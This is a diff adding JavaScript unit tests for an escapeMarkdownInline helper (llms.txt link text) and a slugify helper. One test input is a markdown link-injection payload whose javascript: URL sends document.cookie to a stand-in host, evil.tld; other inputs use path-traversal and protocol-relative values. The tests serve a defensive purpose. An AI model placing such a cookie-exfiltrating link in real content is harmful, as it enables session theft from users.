@@ -330,6 +330,41 @@ test('protocol-relative and data URLs are refused', () => {
 });
 
 // ---------------------------------------------------------------------------
+console.log('\nescapeMarkdownInline (llms.txt link text)');
+
+test('a title cannot close a markdown link and supply its own destination', () => {
+  // llms.txt lines are "- [name](url)". Guarding only the url leaves this open.
+  const evil = "Q3 notes](javascript:fetch('//evil.tld/'+document.cookie)) [";
+  const out = lib.escapeMarkdownInline(evil);
+  assert.ok(!/\]\(/.test(out), `link syntax survived: ${out}`);
+  assert.ok(out.includes('Q3 notes'), 'title text should survive');
+});
+
+test('collapses newlines so one entry cannot become several lines', () => {
+  assert.strictEqual(lib.escapeMarkdownInline('a\nb'), 'a b');
+});
+
+// ---------------------------------------------------------------------------
+console.log('\nslugify (one rule, three former copies)');
+
+test('restricts to url- and path-safe characters', () => {
+  assert.strictEqual(lib.slugify('Hello, World! -- A Post'), 'hello-world-a-post');
+  assert.strictEqual(lib.slugify('../../etc/passwd'), 'etc-passwd');
+  assert.strictEqual(lib.slugify('//evil.example'), 'evil-example');
+});
+
+test('returns empty for a title with nothing slug-able, so callers can skip it', () => {
+  assert.strictEqual(lib.slugify('!!!'), '');
+  assert.strictEqual(lib.slugify(null), '');
+});
+
+test('caps length and never ends on a separator', () => {
+  const out = lib.slugify('a'.repeat(200));
+  assert.ok(out.length <= 60, `too long: ${out.length}`);
+  assert.ok(!out.endsWith('-'), out);
+});
+
+// ---------------------------------------------------------------------------
 console.log('\njsonLdScript');
 
 test('neutralises a </script> breakout inside JSON-LD', () => {
